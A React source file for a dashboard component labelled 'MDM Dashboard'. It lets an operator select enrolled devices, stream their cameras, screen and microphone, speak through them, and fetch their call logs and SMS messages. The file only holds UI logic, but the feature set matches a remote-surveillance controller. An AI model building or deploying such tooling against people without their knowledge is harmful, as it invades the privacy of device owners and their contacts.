import { useState } from 'react'
import { useSocket } from '../hooks/useSocket'
import DeviceList from '../components/DeviceList'
import CameraPanel from '../components/CameraPanel'
import ScreenPanel from '../components/ScreenPanel'
import MicPanel from '../components/MicPanel'
import SpeakPanel from '../components/SpeakPanel'
import InfoPanel from '../components/InfoPanel'
import CallLogsPanel from '../components/CallLogsPanel'
import SMSPanel from '../components/SMSPanel'

export default function Dashboard({ token, onLogout }) {
  const [selected,       setSelected]       = useState(null)
  const [cameraOnFront,  setCameraOnFront]   = useState({})
  const [cameraOnBack,   setCameraOnBack]    = useState({})
  const [screenOn,       setScreenOn]        = useState({})
  const [liveSpeakOn,    setLiveSpeakOn]     = useState({})

  const {
    connected, devices, deviceNames, cameraFrames, screenFrames, micActive,
    deviceInfos, batteries, callLogs, smsMessages, screenshots,
    cameraStartFront, cameraStartBack, cameraStopFront, cameraStopBack,
    screenStart, screenStop, liveSpeakStart, liveSpeakStop,
    micOn, micOff, speak, takeScreenshot, getCallLogs, getSMS, renameDevice,
  } = useSocket(token)

  function handleToggleFront(id) {
    if (cameraOnFront[id]) { cameraStopFront(id); setCameraOnFront(p => ({ ...p, [id]: false })) }
    else { cameraStartFront(id); setCameraOnFront(p => ({ ...p, [id]: true })) }
  }
  function handleToggleBack(id) {
    if (cameraOnBack[id]) { cameraStopBack(id); setCameraOnBack(p => ({ ...p, [id]: false })) }
    else { cameraStartBack(id); setCameraOnBack(p => ({ ...p, [id]: true })) }
  }
  function handleScreenToggle(id) {
    if (screenOn[id]) { screenStop(id); setScreenOn(p => ({ ...p, [id]: false })) }
    else { screenStart(id); setScreenOn(p => ({ ...p, [id]: true })) }
  }
  function handleLiveSpeakToggle(id) {
    if (liveSpeakOn[id]) {
      liveSpeakStop(id); setLiveSpeakOn(p => ({ ...p, [id]: false }))
    } else {
      liveSpeakStart(id); setLiveSpeakOn(p => ({ ...p, [id]: true }))
    }
  }
  function handleMicToggle(id) {
    if (micActive[id]) micOff(id); else micOn(id)
  }

  const displayName = selected ? (deviceNames[selected] || selected) : null

  return (
    <div className="dashboard">
      <aside className="sidebar">
        <div className="sidebar-header">
          <h2>MDM Dashboard</h2>
          <span className={`conn-badge ${connected ? 'on' : 'off'}`}>
            {connected ? 'Connected' : 'Disconnected'}
          </span>
        </div>
        <p className="sidebar-label">Devices</p>
        <DeviceList
          devices={Object.values(devices)}
          selected={selected}
          onSelect={setSelected}
          deviceNames={deviceNames}
          onRename={renameDevice}
        />
        <button className="logout-btn" onClick={onLogout}>Sign Out</button>
      </aside>

      <main className="main-panel">
        {!selected ? (
          <div className="empty-state">Select a device from the sidebar</div>
        ) : (
          <>
            <p className="device-title">
              Monitoring: <strong>{displayName}</strong>
              {deviceNames[selected] && <span className="device-id-sub"> ({selected})</span>}
            </p>
            <div className="panels-grid">

              <CameraPanel
                frameFront={cameraFrames[selected]?.front}
                frameBack={cameraFrames[selected]?.back}
                cameraOnFront={!!cameraOnFront[selected]}
                cameraOnBack={!!cameraOnBack[selected]}
                onToggleFront={() => handleToggleFront(selected)}
                onToggleBack={() => handleToggleBack(selected)}
                onScreenshot={() => takeScreenshot(selected)}
                lastScreenshot={screenshots[selected]}
              />

              <ScreenPanel
                frame={screenFrames[selected]}
                isOn={!!screenOn[selected]}
                onStart={() => handleScreenToggle(selected)}
                onStop={() => handleScreenToggle(selected)}
              />

              <InfoPanel info={deviceInfos[selected]} battery={batteries[selected]} />

              <MicPanel
                isActive={!!micActive[selected]}
                onToggle={() => handleMicToggle(selected)}
              />

              <SpeakPanel
                onSpeak={audio => speak(selected, audio)}
                liveSpeakActive={!!liveSpeakOn[selected]}
                onLiveSpeakStart={() => handleLiveSpeakToggle(selected)}
                onLiveSpeakStop={() => handleLiveSpeakToggle(selected)}
              />

              <CallLogsPanel logs={callLogs[selected]} onRefresh={() => getCallLogs(selected)} />
              <SMSPanel messages={smsMessages[selected]} onRefresh={() => getSMS(selected)} />

            </div>
          </>
        )}
      </main>
    </div>
  )
}
